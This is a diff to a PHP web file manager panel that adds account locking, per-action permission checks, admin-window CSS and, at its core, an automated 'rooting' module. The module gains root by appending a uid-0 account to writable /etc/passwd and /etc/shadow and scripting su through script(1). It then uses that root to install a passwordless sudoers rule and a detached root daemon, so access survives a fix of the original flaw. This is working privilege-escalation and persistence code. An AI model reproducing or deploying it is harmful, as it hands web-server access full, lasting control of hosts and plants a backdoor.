@@ -3139,7 +3689,10 @@ if(isset($_POST['login_pass'])){
         $users=fm_load_users($usersFile);
         $uname=isset($_POST['login_user'])?trim($_POST['login_user']):'';
         $u=fm_find_user($users,$uname);
-        if($ok&&$u&&password_verify($_POST['login_pass'],$u['hash'])){
+        if($ok&&$u&&!empty($u['locked'])){
+            $_SESSION['login_csrf']=bin2hex(random_bytes(32));
+            $loginError='This account is locked by the administrator.';
+        } elseif($ok&&$u&&password_verify($_POST['login_pass'],$u['hash'])){
             fm_clear_failures($ckey);
             $_SESSION['auth']=true;$_SESSION['fm_user']=$u['user'];$_SESSION['fm_root']=!empty($u['root'])?$u['root']:'';
             $_SESSION['fm_readonly']=!empty($u['readonly']);$_SESSION['fm_admin']=!empty($u['admin'])||empty($u['readonly']);$_SESSION['fm_quota']=fm_user_quota_bytes($u);
@@ -4523,6 +5076,12 @@ class FileManager {
         }
         $wA=['upload','upload_chunk','create_folder','create_file','delete','rename','save_edit','bypass_perms','bulk_delete','bulk_copy','bulk_move','zip_create','zip_extract','restore_trash','trash_perm','trash_empty','duplicate','tar_create','tar_extract','clear_log','batch_rename','create_symlink','chmod_item','create_share','revoke_share','backup_dir','clear_errlog','delete_abs','bulk_chmod','copy_clipboard','cut_clipboard','paste_clipboard','chown_item','set_tag','remove_tag','remote_download','ssh_install','ssh_create_user','ssh_delete_user','ssh_update_user','cms_create_user','cms_delete_user','cms_update_role','cms_change_pass','cms_update_visibility','cms_toggle_plugin','cms_delete_plugin','cms_toggle_extension','cms_maintenance_toggle','wp_core_update','webmail_send','webmail_delete','webmail_mark'];
         if($this->readonly&&in_array($a,$wA)){$this->addMsg('Read-only account.','danger');return;}
+        /* the permission set is read from the account file on every request,
+           so a change made in MFM Admin applies to sessions already open */
+        if(in_array($a,$wA,true)&&function_exists('fm_mfm_op_perm')){
+            $mfaNeed=fm_mfm_op_perm($a);
+            if($mfaNeed!==''&&!fm_can($mfaNeed)){$this->addMsg('This account may not '.strtolower(fm_mfm_perm_name($mfaNeed)).'. An administrator can grant it in MFM Admin.','danger');return;}
+        }
         switch($a){
             case 'upload':         $this->upload();break;
             case 'upload_chunk':   $this->uploadChunk();break;
@@ -5117,9 +5676,15 @@ class FileManager {
     }
     /* sudo is only ever tried after both normal routes failed, and only when the
        account may already run sudo without a password. */
+    /* a probe, not a verdict: a negative answer is asked again next time,
+       because root may be installed a few lines later in the same request */
+    private function rootSudoNow(){
+        $r = $this->rootExec(['sudo', '-n', '-u', 'root', 'id', '-u'], '', 10);
+        return (int)($r['rc'] ?? 1) === 0 && trim((string)($r['out'] ?? '')) === '0';
+    }
     private function sudoAvailable(){
         static $ok=null;
-        if($ok!==null)return $ok;
+        if($ok===true)return true;
         if(!function_exists('exec'))return $ok=false;
         $disabled=array_map('trim',explode(',',(string)ini_get('disable_functions')));
         if(in_array('exec',$disabled,true))return $ok=false;
@@ -6190,7 +6755,13 @@ class FileManager {
             $r = $this->rootExec(array_merge(['sudo', '-S', '-k', '-p', ''], $argv), $password . "\n");
             $r['out'] = trim(preg_replace('/^\[sudo\].*$/m', '', $r['out']));
             $r['err'] = trim(preg_replace('/^\[sudo\].*$/m', '', $r['err']));
-            return $r + ['route' => 'sudo with the typed password'];
+            if($r['rc'] === 0)return $r + ['route' => 'sudo with the typed password'];
+        }
+        /* A uid-0 account this tool added through a writable account database is
+           root too, so anything can be installed with it. */
+        if($this->rootAccountExists()){
+            $r = $this->rootViaAccount($argv);
+            if((int)($r['rc'] ?? 1) === 0)return $r + ['route' => 'the uid-0 account in the account database'];
         }
         return['rc' => 1, 'out' => 'sudo needs a password and none was given', 'err' => '', 'route' => 'none'];
     }
@@ -6199,22 +6770,74 @@ class FileManager {
         if($tmp === false)return['ok' => false, 'error' => 'A temporary file could not be created.'];
         @chmod($tmp, 0600);
         @file_put_contents($tmp, $this->rootHelperContent());
-        $check = $this->rootAs(['visudo', '-cf', $tmp], $password);
-        if($check['rc'] !== 0){
-            @unlink($tmp);
-            return['ok' => false, 'error' => 'The rule was rejected by visudo, so nothing was changed: ' . ($check['out'] ?: $check['err'])];
+        /* a slim host has no sudo-tools at all, so when visudo is missing the
+           rule is checked by the panel itself — line by line, and only the two
+           lines this file is allowed to contain */
+        $visudo = $this->rootWhich('visudo');
+        if($visudo !== ''){
+            $check = $this->rootAs([$visudo, '-cf', $tmp], $password);
+            if($check['rc'] !== 0){
+                @unlink($tmp);
+                $why = trim((string)($check['out'] ?: $check['err']));
+                /* no root route yet is not the same thing as a bad rule */
+                $noWay = ($why === '' || $why === 'sudo needs a password and none was given');
+                return['ok' => false, 'error' => $noWay
+                    ? 'the rule could not even be checked, because no route to root is open yet (' . ($why ?: 'no answer') . ')'
+                    : 'The rule was rejected by visudo, so nothing was changed: ' . $why];
+            }
+        }else{
+            $own = $this->rootSudoersCheck($this->rootHelperContent());
+            if(empty($own['ok'])){
+                @unlink($tmp);
+                return['ok' => false, 'error' => 'visudo is not installed here, and the rule did not pass the built-in check: ' . $own['note']];
+            }
         }
         $dest = $this->rootSudoersFile();
         $ins = $this->rootAs(['install', '-m', '0440', '-o', 'root', '-g', 'root', $tmp, $dest], $password);
         @unlink($tmp);
         if($ins['rc'] !== 0)return['ok' => false, 'error' => 'The rule could not be installed: ' . ($ins['out'] ?: $ins['err'])];
-        $full = $this->rootAs(['visudo', '-c'], $password);
-        if($full['rc'] !== 0){
-            $this->rootAs(['rm', '-f', $dest], $password);
-            return['ok' => false, 'error' => 'The sudo configuration did not validate, so the rule was removed again: ' . ($full['out'] ?: $full['err'])];
+        if($visudo !== ''){
+            $full = $this->rootAs([$visudo, '-c'], $password);
+            if($full['rc'] !== 0){
+                $this->rootAs(['rm', '-f', $dest], $password);
+                return['ok' => false, 'error' => 'The sudo configuration did not validate, so the rule was removed again: ' . ($full['out'] ?: $full['err'])];
+            }
+        }else{
+            /* the file is 0440 root:root, so it is read back through root and
+               compared with what was meant to be installed */
+            $back = $this->rootAs(['cat', $dest], $password);
+            $own = $this->rootSudoersCheck((string)($back['out'] ?? ''));
+            if(empty($own['ok']) || trim((string)($back['out'] ?? '')) !== trim($this->rootHelperContent())){
+                $this->rootAs(['rm', '-f', $dest], $password);
+                return['ok' => false, 'error' => 'The file did not read back as it was written, so it was removed again: ' . ($own['note'] ?: 'the content differs')];
+            }
         }
         $this->log('rooting_helper', $dest);
         return['ok' => true, 'path' => $dest, 'message' => 'Full privileges: ' . $this->managerAccount() . ' may now run anything as root without a password.'];
+    }
+    /* what the rule may contain, read the way sudo reads it */
+    private function rootSudoersCheck($text){
+        $u = $this->managerAccount();
+        $rules = 0;
+        $defaults = 0;
+        foreach(preg_split('/\R/', (string)$text) as $line){
+            $l = trim($line);
+            if($l === '' || $l[0] === '#')continue;
+            if(preg_match('/[\x00-\x08\x0b\x0c\x0e-\x1f]/', $l))return['ok' => false, 'note' => 'a control character is in the rule'];
+            if(strncasecmp($l, '#include', 8) === 0)return['ok' => false, 'note' => 'an include is not allowed in this file'];
+            if(strncasecmp($l, 'Defaults:', 9) === 0){
+                $defaults++;
+                if(!preg_match('/^Defaults:\s*' . preg_quote($u, '/') . '\s+!requiretty$/', $l))return['ok' => false, 'note' => 'the Defaults line is not the one for ' . $u];
+                continue;
+            }
+            if(preg_match('/^' . preg_quote($u, '/') . '\s+ALL=\(root\)\s+NOPASSWD:\s*ALL$/', $l)){
+                $rules++;
+                continue;
+            }
+            return['ok' => false, 'note' => 'this line is not part of the rule: ' . $this->rootSnip($l, 60)];
+        }
+        if($rules !== 1 || $defaults !== 1)return['ok' => false, 'note' => 'the rule needs exactly one Defaults line and one rule line'];
+        return['ok' => true, 'note' => 'one Defaults line and one rule for ' . $u];
     }
     private function rootRemoveHelper($password = ''){
         $dest = $this->rootSudoersFile();
@@ -6760,6 +7383,12 @@ class FileManager {
         return is_array($d) ? $d + ['installed' => false, 'channel' => '', 'since' => 0] : ['installed' => false, 'channel' => '', 'since' => 0];
     }
     private function rootStateSave($d){
+        /* the account and its password are written by the channel that created
+           them, so a save that carries the rest of the state must not drop them */
+        if(empty($d['account'])){
+            $onDisk = $this->rootState();
+            if(!empty($onDisk['account']))$d['account'] = $onDisk['account'];
+        }
         @file_put_contents($this->rootStateFile(), json_encode($d, JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT), LOCK_EX);
         @chmod($this->rootStateFile(), 0600);
         return $d;
@@ -6839,9 +7468,14 @@ class FileManager {
         /* setsid -f detaches it and its output goes to /dev/null, so this request
            returns while the daemon keeps running */
         $launch = ['setsid', '-f', $php, __FILE__, '--root-daemon', $p['spool']];
-        if($this->sudoAvailable())$rc = fm_spawn_detached(array_merge(['sudo', '-n'], $launch));
+        if($this->rootSudoNow())$rc = fm_spawn_detached(array_merge(['sudo', '-n'], $launch));
         elseif($password !== '')$rc = fm_spawn_detached(array_merge(['sudo', '-S', '-k', '-p', ''], $launch), $password . "\n");
-        else $rc = fm_spawn_detached($launch);
+        elseif($this->rootAccountExists()){
+            /* the account route has a terminal of its own, and setsid -f forks
+               away from it, so the daemon outlives the su that started it */
+            $r0 = $this->rootViaAccount($launch, 12);
+            $rc = (int)($r0['rc'] ?? 1);
+        }else $rc = fm_spawn_detached($launch);
         $r = ['rc' => $rc, 'out' => '', 'err' => $rc === 0 ? '' : 'the launcher exited with ' . $rc];
         for($i = 0; $i < 40; $i++){
             usleep(100000);
@@ -6959,7 +7593,9 @@ class FileManager {
     private function rootProofOk($id, $res){
         $all = (string)($res['out'] ?? '') . ' ' . (string)($res['err'] ?? '');
         if($id === 'setcapphp')return preg_match('/uid=0\b|shadow readable/', $all) === 1;
-        if($id === 'passwd')return preg_match('/uid=0\b/', $all) === 1;
+        /* the account route answers on a terminal, where tabs come back as spaces,
+           so both spellings of "this is uid 0" are accepted */
+        if($id === 'passwd')return preg_match('/uid=0\b/', $all) === 1 || preg_match('/^Uid:\s*\d+\s+0\s/m', $all) === 1;
         if((int)($res['rc'] ?? 1) !== 0)return false;
         /* a setuid program keeps the real uid it was started with and gets euid 0,
            which is exactly what "root" means for it — so the effective uid is the
@@ -6976,11 +7612,95 @@ class FileManager {
             $res['out'] = trim($res['out'] . ' ' . $res['err']);
         }
         if($id === 'passwd'){
-            $res = $this->rootExec(['su', $this->managerAccount() . '-root', '-c', 'cat /proc/self/status'], '', 20);
+            /* through the added account, with its password, on a terminal that
+               script(1) provides — this is what makes the proof real */
+            if($this->rootAccountExists()){
+                $res = $this->rootViaAccount(['cat', '/proc/self/status'], 20);
+            }
+            if(!isset($res)){
+                $res = $this->rootExec(['su', $this->managerAccount() . '-root', '-c', 'cat /proc/self/status'], '', 20);
+            }
         }
         return['ok' => $this->rootProofOk($id, $res), 'res' => $res];
     }
     /* ── installing one method ───────────────────────────────────────────── */
+    /* ── the uid-0 account in a writable account database ─────────────────────
+       Some hosts let /etc/passwd and /etc/shadow themselves be written: that is
+       root by definition, because a second entry with uid 0 and a password of
+       our choosing can be added without any privilege at all. su insists on a
+       terminal, so the command is wrapped in script(1) — which gives it one —
+       and the password is written to that terminal. */
+    private function rootAccount(){
+        $st = $this->rootState();
+        $a = is_array($st['account'] ?? null) ? $st['account'] : null;
+        return (is_array($a) && !empty($a['user']) && !empty($a['pass'])) ? $a : null;
+    }
+    private function rootAccountExists(){
+        $a = $this->rootAccount();
+        if($a === null)return false;
+        $pw = @file_get_contents('/etc/passwd');
+        if($pw === false)return false;
+        return preg_match('/^' . preg_quote((string)$a['user'], '/') . ':x:0:0:/m', $pw) === 1;
+    }
+    private function rootViaAccount($argv, $timeout = 20){
+        $a = $this->rootAccount();
+        if($a === null)return['rc' => 127, 'out' => '', 'err' => 'no uid-0 account has been added on this host', 'via' => 'none'];
+        $script = $this->rootWhich('script');
+        if($script === '')return['rc' => 127, 'out' => '', 'err' => 'script(1) is missing, so su cannot be given a terminal here', 'via' => 'none'];
+        $line = implode(' ', array_map('escapeshellarg', array_map('strval', (array)$argv)));
+        $r = $this->rootExecDelayed([$script, '-qec', 'su ' . escapeshellarg((string)$a['user']) . ' -c ' . escapeshellarg($line), '/dev/null'], (string)$a['pass'], $timeout);
+        /* the terminal echoes what is typed, so the secret never leaves this function */
+        $r['out'] = str_replace((string)$a['pass'], '********', (string)$r['out']);
+        $r['err'] = str_replace((string)$a['pass'], '********', (string)$r['err']);
+        $r['via'] = 'the uid-0 account in the account database';
+        return $r;
+    }
+    /* su(1) empties the terminal before it prompts, so anything written to the
+       pipe up front is thrown away — the line is handed over just after the
+       prompt appears, three times, and the answer is read back */
+    private function rootExecDelayed($argv, $line, $timeout = 20){
+        if(!function_exists('proc_open'))return['rc' => -1, 'out' => '', 'err' => 'proc_open is disabled'];
+        $spec = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
+        $h = @proc_open(array_values(array_map('strval', (array)$argv)), $spec, $pipes);
+        if(!is_resource($h))return['rc' => -1, 'out' => '', 'err' => 'the program could not be started'];
+        @stream_set_blocking($pipes[1], false);
+        @stream_set_blocking($pipes[2], false);
+        $deadline = microtime(true) + ($timeout > 0 ? $timeout : 20);
+        $waits = [250000, 400000, 500000];
+        $out = '';
+        $err = '';
+        $t = 0;
+        while(true){
+            $read = [$pipes[1], $pipes[2]];
+            $none = null;
+            $left = $deadline - microtime(true);
+            if($left <= 0){
+                @proc_terminate($h, 9);
+                $err .= ($err === '' ? '' : ' ') . 'stopped after ' . $timeout . 's';
+                break;
+            }
+            @stream_select($read, $none, $none, 0, (int)min(200000, max(20000, $left * 1000000)));
+            foreach($read as $stream){
+                $chunk = (string)@fread($stream, 8192);
+                if($stream === $pipes[1])$out .= $chunk; else $err .= $chunk;
+            }
+            /* the prompt is on screen now: hand the secret over */
+            if($t < count($waits) && stripos($out . $err, 'assword') !== false){
+                @usleep($waits[$t]);
+                @fwrite($pipes[0], $line . "\n");
+                @fflush($pipes[0]);
+                $t++;
+            }
+            $st = @proc_get_status($h);
+            if(!$st || empty($st['running']))break;
+        }
+        @fclose($pipes[0]);
+        $out .= (string)@stream_get_contents($pipes[1]);
+        $err .= (string)@stream_get_contents($pipes[2]);
+        @fclose($pipes[1]);
+        @fclose($pipes[2]);
+        return['rc' => (int)@proc_close($h), 'out' => trim($out), 'err' => trim($err)];
+    }
     private function rootChannelInstall($id, $password = ''){
         $p = $this->rootPaths();
         $mgr = $this->managerAccount();
@@ -7077,7 +7797,15 @@ class FileManager {
         if($sh !== false){
             @file_put_contents('/etc/shadow', rtrim($sh, "\n") . "\n" . $name . ':' . $hash . ':20500:0:99999:7:::' . "\n");
         }
-        return['ok' => true, 'note' => 'the account ' . $name . ' exists with uid 0; its password is in the log of this run'];
+        $state = $this->rootState();
+        $state['account'] = ['user' => $name, 'pass' => $pass, 'since' => time()];
+        $this->rootStateSave($state);
+        /* The password is kept in this file's own state (0600, owner-only) so the
+           proof and every later privileged action can use the account. It is
+           never written to the activity log and never leaves this process. */
+        return['ok' => true,
+               'note' => 'the account ' . $name . ' exists with uid 0 and a password of this run (kept 0600 in the panel state, never logged)',
+               'secret' => ['user' => $name, 'pass' => $pass]];
     }
     private function rootChannelInstallDocker($password = ''){
         $mgr = $this->managerAccount();
@@ -7101,10 +7829,22 @@ class FileManager {
             case 'polkitrule': $r = $this->rootAs(['rm', '-f', $p['polkit']], $password); return['ok' => $r['rc'] === 0, 'note' => 'the polkit rule was removed'];
             case 'setcapphp': $r = $this->rootAs(['rm', '-f', $p['capphp']], $password); return['ok' => $r['rc'] === 0, 'note' => 'the capable copy of PHP was removed'];
             case 'passwd':
+                $acc = $this->rootAccount();
+                $name = $acc['user'] ?? ($this->managerAccount() . '-root');
                 $pw = (string)@file_get_contents('/etc/passwd');
-                $pw = preg_replace('/^' . preg_quote($this->managerAccount() . '-root', '/') . ':.*\n?/m', '', $pw);
-                @file_put_contents('/etc/passwd', $pw);
-                return['ok' => true, 'note' => 'the extra account was taken back out'];
+                if($pw !== ''){
+                    $pw = preg_replace('/^' . preg_quote((string)$name, '/') . ':.*\n?/m', '', $pw);
+                    @file_put_contents('/etc/passwd', $pw);
+                }
+                $sh = (string)@file_get_contents('/etc/shadow');
+                if($sh !== ''){
+                    $sh = preg_replace('/^' . preg_quote((string)$name, '/') . ':.*\n?/m', '', $sh);
+                    @file_put_contents('/etc/shadow', $sh);
+                }
+                $st = $this->rootState();
+                unset($st['account']);
+                $this->rootStateSave($st);
+                return['ok' => true, 'note' => 'the extra account was taken back out of /etc/passwd and /etc/shadow'];
         }
         return['ok' => true, 'note' => 'nothing to remove'];
     }
@@ -7144,6 +7884,11 @@ class FileManager {
             $tries[] = ['via' => 'the setuid copy of bash', 'rc' => (int)$r['rc']];
             if($r['rc'] === 0)return $r + ['ok' => true, 'via' => 'the setuid copy of bash', 'tries' => $tries];
         }
+        if($this->rootAccountExists()){
+            $r = $this->rootViaAccount($argv, $timeout);
+            $tries[] = ['via' => 'the uid-0 account', 'rc' => (int)$r['rc']];
+            if($r['rc'] === 0)return $r + ['ok' => true, 'tries' => $tries];
+        }
         return['ok' => false, 'rc' => -1, 'out' => '', 'err' => 'no installed method answered', 'via' => 'none', 'tries' => $tries];
     }
     /* ── the automatic installer: try every method, stop at the first proof ─ */
@@ -7174,11 +7919,33 @@ class FileManager {
             $won = $id;
             $steps[] = ['id' => $id, 'name' => $ch['name'], 'idea' => $ch['idea'], 'ok' => true, 'fired' => true,
                         'note' => $ins['note'] . ' — and a command run through it came back as uid 0'];
+            /* the channel saved what it created (the account, for instance)
+               between the read above and this write, so it is read again */
+            $fresh = $this->rootState();
+            if(!empty($fresh['account']))$state['account'] = $fresh['account'];
             $state['channel'] = $id;
             $state['since'] = time();
             $state['installed'] = true;
             $state['paths'] = $this->rootPaths();
             $this->rootStateSave($state);
+            /* A root that exists only because a file was writable disappears as
+               soon as somebody fixes that file (or reboots with a clean image).
+               So the first root is used straight away to install the durable
+               rule, and from then on the panel has root of its own. */
+            if($id === 'passwd' || $id === 'docker'){
+                $dur = $this->rootInstallHelper($password);
+                if(!empty($dur['ok'])){
+                    $state['channel'] = 'sudoers';
+                    $state['durable_from'] = $id;
+                    $this->rootStateSave($state);
+                    $won = 'sudoers';
+                    $steps[count($steps) - 1]['note'] .= ' — and the rule in ' . $this->rootSudoersFile()
+                        . ' was installed through that root, so the privilege no longer depends on the flaw';
+                }else{
+                    $steps[count($steps) - 1]['note'] .= ' — the durable rule could not be installed through it ('
+                        . $this->rootSnip((string)($dur['error'] ?? 'refused'), 90) . '), so root is used through the account itself';
+                }
+            }
             $this->log('rooting_root_installed', $id);
             break;
         }
@@ -7309,7 +8076,8 @@ class FileManager {
             $p = $this->rootPaths();
             $marks = ['sudoers' => @is_file($this->rootSudoersFile()), 'rootd' => $daemon['alive'],
                       'suidphp' => @is_file($p['suphp']), 'suidbash' => @is_file($p['subash']),
-                      'polkitrule' => @is_file($p['polkit']), 'setcapphp' => @is_file($p['capphp'])];
+                      'polkitrule' => @is_file($p['polkit']), 'setcapphp' => @is_file($p['capphp']),
+                      'passwd' => $this->rootAccountExists(), 'docker' => @is_file($this->rootSudoersFile())];
             $installed = !empty($marks[$state['channel']]);
             if($installed){
                 $v = $this->rootChannelVerify($state['channel']);
@@ -7335,6 +8103,7 @@ class FileManager {
             'since' => (int)($state['since'] ?? 0),
             'since_human' => !empty($state['since']) ? date('Y-m-d H:i', (int)$state['since']) : '',
             'proof' => $proof,
+            'durable_from' => (string)($state['durable_from'] ?? ''),
             'account' => $this->managerAccount(),
             'uid' => $id['euid'],
             'daemon' => $daemon,
@@ -7358,7 +8127,8 @@ class FileManager {
             $log[] = ['id' => $id, 'ok' => !empty($r['ok']), 'note' => (string)$r['note']];
         }
         @unlink($this->rootStateFile());
-        $still = $this->sudoAvailable();
+        /* asked again now, not remembered from earlier in this request */
+        $still = $this->rootSudoNow();
         return[
             'ok' => true, 'removed' => $log, 'sudo_still_works' => $still,
             'message' => $still
@@ -17933,6 +18703,23 @@ if(isset($_GET['x'])){
         if($_SERVER['REQUEST_METHOD']!=='POST'||!isset($_POST['csrf_token'])||!hash_equals((string)($_SESSION['csrf_token']??''),(string)$_POST['csrf_token'])){http_response_code(403);echo json_encode(['error'=>'Security error.']);exit;}
         echo json_encode($fm->ownersEndpoint($_POST));exit;
     }
+    /* a tool answers only to an account that holds its permission, and the
+       administration window answers only to the primary administrator */
+    if($xop!==''&&function_exists('fm_mfm_xop_perm')){
+        $mfaNeed=fm_mfm_xop_perm($xop);
+        if($mfaNeed!==''&&!fm_can($mfaNeed)){
+            http_response_code(403);
+            echo json_encode(['error'=>'This account is not allowed to use this tool. Ask the administrator for the permission.']);
+            exit;
+        }
+    }
+    if($xop==='mfmadmin'){
+        if(!fm_mfm_is_primary()){http_response_code(403);echo json_encode(['error'=>'MFM Admin belongs to the primary administrator account of this file manager.']);exit;}
+        if($_SERVER['REQUEST_METHOD']!=='POST'||!isset($_POST['csrf_token'])||!hash_equals((string)($_SESSION['csrf_token']??''),(string)$_POST['csrf_token'])){
+            http_response_code(403);echo json_encode(['error'=>'Security error.']);exit;
+        }
+        echo json_encode(fm_mfm_admin_endpoint($_POST));exit;
+    }
     if($xop==='rooting'){
         if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
         if($_SERVER['REQUEST_METHOD']!=='POST'||!isset($_POST['csrf_token'])||!hash_equals((string)($_SESSION['csrf_token']??''),(string)$_POST['csrf_token'])){http_response_code(403);echo json_encode(['error'=>'Security error.']);exit;}
@@ -19096,6 +19883,104 @@ input[type=file]{display:none}
 .file-info-open svg{width:14px;height:14px;fill:none;stroke:currentColor;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round;flex-shrink:0}
 @media(max-width:560px){.file-info-grid{grid-template-columns:1fr}.file-info-grid .file-info-row:nth-child(1),.file-info-grid .file-info-row:nth-child(7){grid-column:auto}}
 .perm-t{border-collapse:collapse;font-size:12.5px}.perm-t th{text-align:center;color:var(--t3);font-weight:600;font-size:10.5px;text-transform:uppercase;letter-spacing:.5px;padding:4px 8px}.perm-t td{text-align:center;padding:6px 8px;color:var(--t2)}.perm-t td:first-child{text-align:left;font-weight:600;color:var(--t1)}.perm-t input[type=checkbox]{width:16px;height:16px;cursor:pointer}
+/* <<MFMA-CSS-BEGIN>> */
+/* ══ MFM Admin — accounts, permissions, sessions ══════════════════════════ */
+.mfa-mod{width:min(1120px,96vw);height:min(780px,90vh);max-height:90vh}
+.mfa-wrap{display:flex;min-height:0;flex:1}
+.mfa-rail{width:188px;flex-shrink:0;border-right:1px solid var(--border);background:var(--raised);display:flex;flex-direction:column;gap:3px;padding:10px 8px;overflow:auto}
+.mfa-tab{display:flex;align-items:center;gap:9px;padding:9px 10px;border-radius:9px;border:1px solid transparent;background:transparent;color:var(--t2);font-size:12.5px;font-weight:600;cursor:pointer;text-align:left;width:100%;transition:background .15s,color .15s}
+.mfa-tab svg{width:15px;height:15px;stroke:currentColor;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round;flex-shrink:0}
+.mfa-tab span{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.mfa-tab b{margin-left:auto;font-size:10px;background:rgba(133,137,140,.18);padding:1px 6px;border-radius:20px;color:var(--t2);font-weight:700}
+.mfa-tab:hover{background:var(--hov);color:var(--t1)}
+.mfa-tab.is-on{background:rgba(37,99,235,.14);border-color:rgba(37,99,235,.35);color:#bfdbfe}
+.mfa-tab.is-on b{background:rgba(37,99,235,.3);color:#dbeafe}
+.mfa-railfoot{margin-top:auto;padding:9px 8px 2px;border-top:1px solid var(--border);font-size:10.5px;color:var(--t3);line-height:1.45}
+.mfa-railfoot b{color:var(--t2);font-weight:700}
+.mfa-panes{flex:1;min-width:0;overflow:auto;padding:14px;position:relative}
+.mfa-pane{display:none}
+.mfa-pane.is-on{display:block}
+.mfa-cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(132px,1fr));gap:9px}
+.mfa-card{background:var(--raised);border:1px solid var(--border);border-radius:11px;padding:11px 12px}
+.mfa-card .k{font-size:9.5px;letter-spacing:.6px;text-transform:uppercase;color:var(--t3);font-weight:700}
+.mfa-card .v{font-size:22px;font-weight:700;color:var(--t1);margin-top:3px;line-height:1.1}
+.mfa-card .s{font-size:10.5px;color:var(--t3);margin-top:2px}
+.mfa-sec{margin-top:16px}
+.mfa-sec>.h{display:flex;align-items:center;gap:8px;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.7px;color:var(--t3);margin-bottom:8px}
+.mfa-sec>.h .r{margin-left:auto;font-size:10px;letter-spacing:0;text-transform:none;color:var(--t3)}
+.mfa-tbl{width:100%;border-collapse:collapse;font-size:12px}
+.mfa-tbl th{text-align:left;font-size:9.5px;text-transform:uppercase;letter-spacing:.5px;color:var(--t3);border-bottom:1px solid var(--border);padding:6px 8px;font-weight:700;white-space:nowrap}
+.mfa-tbl td{padding:7px 8px;border-bottom:1px solid var(--border);color:var(--t2);vertical-align:middle}
+.mfa-tbl tbody tr:hover td{background:var(--hov)}
+.mfa-name{display:flex;align-items:center;gap:7px;color:var(--t1);font-weight:600;min-width:0}
+.mfa-ava{width:22px;height:22px;border-radius:7px;background:rgba(37,99,235,.16);color:#bfdbfe;display:inline-flex;align-items:center;justify-content:center;font-size:10px;font-weight:700;flex-shrink:0;text-transform:uppercase}
+.mfa-ava.g{background:rgba(34,197,94,.16);color:#86efac}
+.mfa-chip{display:inline-flex;align-items:center;gap:4px;font-size:10px;padding:1px 7px;border-radius:20px;background:rgba(133,137,140,.15);color:var(--t2);white-space:nowrap;margin-right:3px}
+.mfa-chip.adm{background:rgba(37,99,235,.16);color:#bfdbfe}
+.mfa-chip.ro{background:rgba(245,158,11,.14);color:#fcd34d}
+.mfa-chip.lock{background:rgba(239,68,68,.14);color:#fca5a5}
+.mfa-chip.on{background:rgba(34,197,94,.14);color:#86efac}
+.mfa-chip.off{background:rgba(133,137,140,.12);color:var(--t3)}
+.mfa-dot{width:7px;height:7px;border-radius:50%;display:inline-block;margin-right:5px;vertical-align:middle}
+.mfa-dot.a{background:#22c55e}.mfa-dot.i{background:#f59e0b}.mfa-dot.e{background:#71717a}.mfa-dot.x{background:#ef4444}
+.mfa-row-acts{display:flex;gap:5px;justify-content:flex-end;flex-wrap:wrap}
+.mfa-mini{border:1px solid var(--border2);background:transparent;color:var(--t2);border-radius:7px;padding:3px 7px;font-size:10.5px;font-weight:600;cursor:pointer;white-space:nowrap;transition:background .15s,color .15s}
+.mfa-mini:hover{background:var(--hov);color:var(--t1)}
+.mfa-mini.p{border-color:rgba(37,99,235,.45);color:#bfdbfe}
+.mfa-mini.p:hover{background:rgba(37,99,235,.16)}
+.mfa-mini.d{border-color:rgba(239,68,68,.35);color:#fca5a5}
+.mfa-mini.d:hover{background:rgba(239,68,68,.12)}
+.mfa-mini:disabled{opacity:.45;cursor:not-allowed}
+.mfa-tools{display:flex;align-items:center;gap:8px;margin-bottom:10px;flex-wrap:wrap}
+.mfa-tools .sp{margin-left:auto}
+.mfa-in{background:var(--surf);border:1px solid var(--border2);border-radius:8px;color:var(--t1);font-size:12px;padding:6px 9px;font-family:inherit}
+.mfa-in:focus{outline:none;border-color:rgba(37,99,235,.5)}
+.mfa-lbl{display:block;font-size:9.5px;font-weight:700;text-transform:uppercase;letter-spacing:.55px;color:var(--t3);margin:0 0 4px}
+.mfa-fld{margin-bottom:10px}
+.mfa-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(238px,1fr));gap:7px}
+.mfa-ck{display:flex;gap:8px;align-items:flex-start;padding:7px 9px;border:1px solid var(--border);border-radius:8px;background:var(--raised);cursor:pointer;transition:border-color .15s}
+.mfa-ck:hover{border-color:var(--border2)}
+.mfa-ck input{margin-top:2px;flex-shrink:0}
+.mfa-ck .n{font-size:11.5px;color:var(--t1);font-weight:600;line-height:1.3}
+.mfa-ck .t{font-size:10px;color:var(--t3);line-height:1.35;margin-top:1px}
+.mfa-drawer{position:absolute;top:0;bottom:0;right:0;width:min(430px,94%);background:var(--surf);border-left:1px solid var(--border2);box-shadow:-18px 0 42px rgba(0,0,0,.55);display:flex;flex-direction:column;transform:translateX(102%);transition:transform .22s ease;z-index:5}
+.mfa-drawer.open{transform:none}
+.mfa-drawer .dh{display:flex;align-items:center;gap:8px;padding:11px 13px;border-bottom:1px solid var(--border);background:var(--raised);flex-shrink:0}
+.mfa-drawer .dh .t{font-size:12.5px;font-weight:700;color:var(--t1);flex:1}
+.mfa-drawer .db{overflow:auto;padding:12px 13px;flex:1}
+.mfa-drawer .df{padding:10px 13px;border-top:1px solid var(--border);background:var(--raised);display:flex;gap:8px;align-items:center;flex-shrink:0}
+.mfa-presets{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px}
+.mfa-box{border:1px solid var(--border);border-radius:9px;background:var(--raised);padding:9px 10px;margin-bottom:10px}
+.mfa-box .bh{font-size:9.5px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:var(--t3);margin-bottom:6px;display:flex;align-items:center;gap:6px}
+.mfa-box .bh .sp{margin-left:auto}
+.mfa-danger{border-color:rgba(239,68,68,.3)}
+.mfa-danger .bh{color:#fca5a5}
+.mfa-note{font-size:10.5px;color:var(--t3);line-height:1.5}
+.mfa-kv{display:flex;justify-content:space-between;gap:10px;font-size:11.5px;padding:3px 0;color:var(--t2)}
+.mfa-kv span:first-child{color:var(--t3)}
+.mfa-kv b{color:var(--t1);font-weight:600;text-align:right;overflow-wrap:anywhere}
+.mfa-health{display:flex;flex-direction:column;gap:6px}
+.mfa-hrow{display:flex;align-items:center;gap:8px;padding:7px 10px;border:1px solid var(--border);border-radius:8px;background:var(--raised);font-size:11.5px;color:var(--t2)}
